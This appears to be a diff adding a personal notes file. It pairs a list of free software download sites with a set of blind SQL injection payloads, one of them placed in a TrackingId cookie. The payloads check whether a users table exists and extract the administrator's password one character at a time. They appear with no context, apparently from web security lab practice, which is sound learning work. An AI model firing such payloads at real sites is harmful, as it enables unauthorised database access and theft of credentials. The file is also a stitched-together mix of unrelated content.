@@ -1,0 +1,30 @@
+Best website to download PC software free | PC software free download
+
+Get into PC  https://getintopc.com/
+FileHippo - https://filehippo.com/
+Softonic - https://en.softonic.com/
+Downloadcrew - https://www.downloadcrew.com/
+MajorGeeks - https://www.majorgeeks.com/
+FileHorse - https://www.filehorse.com/
+Softpedia - https://www.softpedia.com/
+SnapFiles - https://www.snapfiles.com/
+SourceForge - https://sourceforge.net/
+TechSpot - https://www.techspot.com/
+CNET Download - https://download.cnet.com/windows/
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+ TrackingId=ioWy8kHouZ4gEeo7' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+
+
+ ' AND (select 'a' from users where username='adminstrator')= 'a
+ ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+
+
+ ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+ ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+
+ ' AND (SELECT 'a' FROM users LIMIT 1)='a;
+ ' AND (SELECT 'a' from users limit 1) ='a;
